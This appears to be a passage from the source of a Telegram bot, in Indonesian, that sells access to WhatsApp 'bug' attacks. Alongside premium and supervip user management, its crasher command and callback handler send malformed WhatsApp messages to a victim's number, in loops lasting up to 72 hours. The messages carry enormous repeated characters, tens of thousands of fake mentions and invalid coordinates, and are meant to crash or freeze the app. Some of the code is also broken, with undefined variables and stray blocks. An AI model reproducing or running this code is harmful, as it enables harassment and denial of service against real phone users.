  if (!newUserId) {
    return bot.sendMessage(chatId, "⚠️ Mohon masukkan ID pengguna yang valid.");
  }

  if (supervipUsers.includes(newUserId)) {
    return bot.sendMessage(
      chatId,
      "Pengguna sudah terdaftar sebagai supervip."
    );
  }

  supervipUsers.push(newUserId);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar supervip.`
    );
  });
});

bot.onText(/\/delsupervip (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menghapus pengguna supervip.",
      { parse_mode: "Markdown" }
    );
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  if (!supervipUsers.includes(userIdToRemove)) {
    return bot.sendMessage(
      chatId,
      "Pengguna tidak ditemukan dalam daftar supervip."
    );
  }

  supervipUsers = supervipUsers.filter((id) => id !== userIdToRemove);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar supervip.`
    );
  });
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat melihat daftar pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const premiumList = premiumUsers
    .map((id, index) => `${index + 1}. ${id}`)
    .join("\n");

  bot.sendMessage(
    chatId,
    `Daftar Pengguna Premium:\n${premiumList || "Tidak ada pengguna premium."}`,
    { parse_mode: "Markdown" }
  );
});
bot.onText(/\/cekprem/, (msg) => {
  const chatId = msg.chat.id;

  if (!isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Fitur Premium\nAnda tidak memiliki akses ke fitur ini. Silakan upgrade ke premium.",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "Selamat! Anda memiliki akses ke fitur premium.");
});
const premiumFile = path.resolve("./premium.js");
let premiumUsers = require("./premium.js");

bot.onText(/\/addprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nHanya pemilik bot yang dapat menambah pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");

  if (!newUserId) {
    return bot.sendMessage(chatId, "⚠️ Mohon masukkan ID pengguna yang valid.");
  }

  if (premiumUsers.includes(newUserId)) {
    return bot.sendMessage(chatId, "Pengguna sudah terdaftar sebagai premium.");
  }

  premiumUsers.push(newUserId);

  const fileContent = `const premiumUsers = ${JSON.stringify(premiumUsers, null, 2)};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar premium.`
    );
  });
});

bot.onText(/\/delprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nHanya pemilik bot yang dapat menghapus pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  if (!premiumUsers.includes(userIdToRemove)) {
    return bot.sendMessage(
      chatId,
      "Pengguna tidak ditemukan dalam daftar premium."
    );
  }

  premiumUsers = premiumUsers.filter((id) => id !== userIdToRemove);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar premium.`
    );
  });
});

bot.onText(/\/addsender(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const input = match[1];
  if (!input) {
    return bot.sendMessage(chatId, "Contoh penggunaan: /addsender 6281234567890");
  }

  const botNumber = input.replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addsender:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/x𝚌𝚛𝚊𝚜𝚑𝚎𝚛(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const rawTarget = match[1]?.replace(/[^0-9]/g, "") || "";
  const target = `${rawTarget}@s.whatsapp.net`;

  if (!isPremium(userId) && !isOwner(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, "Akses Ditolak\nPerintah ini hanya untuk pengguna terdaftar.", { parse_mode: "Markdown" });
  }

  if (rawTarget.length < 8 || rawTarget.length > 15) {
    return bot.sendMessage(chatId, "Format Nomor salah!\nContoh: /xtrash 62xxxx");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "Tidak ada bot WhatsApp aktif. Gunakan /addsender untuk menambahkan.");
  }

  if (cooldownEnabled) {
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remaining = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⚠️ Tunggu ${remaining} detik lagi.`, { parse_mode: "Markdown" });
    }
    cooldowns.set(userId, now);
  }

  const buttons = {
    inline_keyboard: [
      [{ text: "𑂹𝐗𝐏𝐥𝐨𝐢𝐭 𝐗᳑᷼𝐯𝐢𝐬⃪⃯͒𝐢𝐛𑂺͢𝐥𝐞᭄", callback_data: `xinvisible ${rawTarget}` }],
      [{ text: "𑂹𝐗𝐏𝐥𝐨𝐢𝐭 𝐗⃯ᴅᴇʟᴀʏ᭄", callback_data: `xdelay ${rawTarget}` }],
      [{ text: "𑂹𝐗𝐩𝐥𝐨𝐢𝐭 𝐗̅໌𝐩𝐫͢᷍𝐨𝐭⃯𝐨᭄", callback_data: `xprotocold ${rawTarget}` }],
      [{ text: "𑂹𝐗𝐏𝐥𝐨𝐢𝐭 𝐗𝐬⃯ͯ𝐭𝐮͢᷍𝐧𝐭᭄", callback_data: `xstunt ${rawTarget}` }]
    ]
  };

  const photoPath = "./assets/select.jpg";
  const caption = `𝐒𝐞𝐥𝐞𝐜𝐭 𝐁𝐮𝐭𝐭𝐨𝐧 𝐓𝐨 𝐔𝐬𝐢𝐧𝐠 𝐁𝐮𝐠`;

  bot.sendPhoto(chatId, photoPath, {
    caption,
    parse_mode: "Markdown",
    reply_markup: buttons
  });
});


bot.on("callback_query", async (ctx) => {
  try {
    const callbackData = ctx.data;
    const [action, rawTarget] = callbackData.split(" ");
    const target = `${rawTarget}@s.whatsapp.net`;
    const chatId = ctx.message.chat.id;
    const messageId = ctx.message.message_id;
    const userId = ctx.from.id;

    if (!isPremium(userId) && !isOwner(userId) && !isSupervip(userId)) {
      await bot.answerCallbackQuery(ctx.id, {
        text: "Akses ditolak: tidak diizinkan",
        show_alert: false
      });
      return;
    }

    if (!["x_invisible", "x_bulldozer", "x_protocold", "x_stunt"].includes(action)) return;

    await bot.answerCallbackQuery(ctx.id);
    await bot.deleteMessage(chatId, messageId);

    const photoPath = "./assets/loading.png";
    const progressStages = [
      { bar: "[█░░░░░░░░░]", percent: "10%" },
      { bar: "[███░░░░░░░]", percent: "30%" },
      { bar: "[█████░░░░░]", percent: "50%" },
      { bar: "[███████░░░]", percent: "70%" },
      { bar: "[█████████░]", percent: "90%" },
      { bar: "[██████████]", percent: "100%" }
    ];

    const buildProgressText = (bar, percent) => {
      return `\`\`\`
=-=-=-=-=[ 𝐏𝐑𝐎𝐆𝐑𝐄𝐒 ]=-=-=-=-=
– Target   : ${target}
– Command  : ${action.replace('x_', '')}
– Status   : ${bar} ${percent}
– TotalBot : ${sessions.size}
\`\`\`
©𝗥𝗲𝘅𝗫𝘅𝗠?`;
    };

    const progressMsg = await bot.sendPhoto(chatId, photoPath, {
      caption: buildProgressText(progressStages[0].bar, progressStages[0].percent),
      parse_mode: "Markdown"
    });

    const realChatId = progressMsg.chat.id;
    const realMsgId = progressMsg.message_id;

    for (let i = 1; i < progressStages.length; i++) {
      await new Promise(res => setTimeout(res, 1000));
      await bot.editMessageCaption(
        buildProgressText(progressStages[i].bar, progressStages[i].percent),
        {
          chat_id: realChatId,
          message_id: realMsgId,
          parse_mode: "Markdown"
        }
      );
    }

    let successCount = 0;
    let failCount = 0;

    for (const [, danzy] of sessions.entries()) {
      try {
        if (!danzy.user) continue;
        for (let i = 0; i < 30; i++) {
          if (action === "xinvisible") {
            await execDelay(danzy, target);
          } else if (action === "xdelay") {
            await Delaytravadex(danzy, target); // di sini set fucnt lu
            await Delaytravadex(danzy, target);
            await Delaytravadex(danzy, target);
            await Delaytravadex(danzy, target);
            await Delaytravadex(danzy, target); 
          } else if (action === "xprotocold") {
            await invisibleFC(danzy, target); // di sini set fucnt lu
            await trashdevice(danzy, target);
            await VanitasFC(danzy, target);
            await VanitasFC(danzy, target); 
          } else if (action === "xstunt") {
            await CosmoUisystem(danzy, target, true); // di sini set fucnt lu 
            await CosmoUisystem(danzy, target, true); 
          }
        }
        successCount++;
      } catch {
        failCount++;
      }
    }

    const finalText = `\`\`\`
=-=-=-=-=[ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒 ]=-=-=-=-=
– Target   : ${target}
– Command  : ${action.replace('x_', '')}
– Status   : Success Mengirim Bug! ✓
– Sukses   : ${successCount}
– Gagal    : ${failCount}
– TotalBot : ${sessions.size}
\`\`\`
®Danzy?`;

    await bot.editMessageCaption(finalText, {
      chat_id: realChatId,
      message_id: realMsgId,
      parse_mode: "Markdown"
    });

  } catch (err) {
    console.error("Error:", err.message);
    bot.sendMessage(ctx.message.chat.id, "Terjadi error saat menjalankan perintah.");
  }
});
//==========[ F I N A L - C A S E ]==========\\

//==========[ F U N C - B U G ]==========\\
async function Delaytravadex(target) {
            for (let i = 0; i < 20; i++) {
        await danzy.relayMessage(target, 
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "H̻a̻i̻.̻.̻.̻.̻",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: 'galaxy_message',
                                paramsJson: {\"screen_2_OptIn_0\":true,               \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex               Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",                      \"screen_1_TextInput_2\":\"Alwaysaqioo@trash.lol\",                           \"screen_1_TextInput_3\":\"94643116\",                                      \"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(10)}\",             \"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-            Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",                       \"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"},
                                version: 3
                            }
                        }
                    }
                }
            }, 
            { participant: { jid: target } }
        );
    }
}

let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "[‌‌𝖍𝕬𝖉𝖊𝖘𝕰𝖘𝖘𝖊𝖓𝖈𝖊𝖃",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "●◉◎◈◎◉●H̻i̻!̻"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*Etichaly*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "Etichaly"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await danzy.relayMessage(target, msg.message, ptcp ? {
    participant: {
     jid: target
    }
   } : {});
        }

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function invisibleFC(target) {

    console.log(chalk.red(`Xforce Send Bug...`));
let ZyroNieh = JSON.stringify({
  status: true,
  criador: "ZyroCrash",
  timestamp: Date.now(),
  noise: "}".repeat(1000000), // 1 juta karakter
  resultado: {
    type: "md",
    dummyRepeat: Array(100).fill({
      id: "ZyroBot" + Math.random(),
      message: "\u200f".repeat(5000),
      crash: {
        deepLevel: {
          level1: {
            level2: {
              level3: {
                level4: {
                  level5: {
                    loop: Array(50).fill("🪷".repeat(500))
                  }
                }
              }
            }
          }
        }
      }
    }),
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: -98411,
      _maxListeners: Infinity,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: new Array(500).fill([99, 99, 99]),
        browser: new Array(100).fill(["Chrome", "Linux"]),
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 100,
        keepAliveIntervalMs: 10,
        logger: {
          logs: Array(1000).fill("ZyroPenggodaJanda")
        },
        spam: Array(1000).fill("🪺").join(""),
        auth: { Object: "authData" },
        crashTrigger: {
          nullField: null,
          undefinedField: undefined,
          boolSwitch: [true, false, false, true, null],
          crazyArray: new Array(10000).fill(Math.random())
        },
        mobile: true
      }
    }
  }  
});
    const generateLocationMessage = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                        degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                    name: "ꦾ".repeat(10000),
                    address: "\u200f",
                  nativeFlowMessage: {
              messageParamsJson: "}".repeat(100000),
              },
                    contextInfo: {
                        mentionedJid: [
                            target,
                            ...Array.from({ length: 40000 }, () =>
                                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ],
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {});

    await danzy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: ZyroNieh,
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    }, {
        participant: target
    });
}

async function trashdevice(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `𝐈𝐍‌‌𝐃𝐈Σ𝐓𝐈𝐕𝚵⃰‌⃟༑‌⃟༑𝐅𝐋𝚯𝚯𝐃𝐁‌𝐔𝐑𝐒𝐇 ラ‣ 𐎟`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "ngewe ama maklo #hades" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ALWAYSAQIOO" }],
                        isForwarded: true,
                        quotedMessage: {
        documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "999999999999",
           pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "Alwaysaqioo The Juftt️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
      }
                    }
                    }
                }
            }
        }
    };

    danzy.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}

async function VanitasFC(danzy, targetNumber) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "vanitas",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "vanitas",
                address: "vanitas",
              },
            },
            body: {
              text: "vanitas",
            },
            nativeFlowMessage: {
              messageParamsJson: "\n".repeat(10000),
            },
            contextInfo: {
              participant: targetNumber,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await danzy.relayMessage(targetNumber, message, {
      messageId: null,
      participant: { jid: targetNumber },
      userJid: targetNumber,
    });
  } catch (err) {
    console.log(err);
  }
}

async function CosmoUisystem(target, ptcp = true) {
let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "[‌‌𝖍𝕬𝖉𝖊𝖘𝕰𝖘𝖘𝖊𝖓𝖈𝖊𝖃",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "Reversed by Cosmo"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*Etichaly*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "Etichaly"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await danzy.relayMessage(target, msg.message, ptcp ? {
    participant: {
     jid: target
    }
   } : {});
        }
        
async function execDelay(target, durationHours = 72) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (count < 1000) {
        await exDelay(target);
        console.log(chalk.yellow(`Proses kirim bug sampai ${count + 1}/1000 target> ${target}`));
        count++;
      } else {
        console.log(chalk.green(`[✓] Success Send Bug 1000 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 1000 Messages"));
      }
      await new Promise(resolve => setTimeout(resolve, 100));
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }

  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);
}

async function exDelay(target) {
await danzy.relayMessage(
"status@broadcast", {
extendedTextMessage: {
text: `XrL ~ Dominations\n https://t.me/xrellyy\n`,
contextInfo: {
mentionedJid: [
"6285215587498@s.whatsapp.net",
...Array.from({
length: 40000
}, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
]
}
}
}, {
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]
}]
}]
}
);
}

// isi fucnt lu


//==========[ F I N A L - F U N C T ]========\\
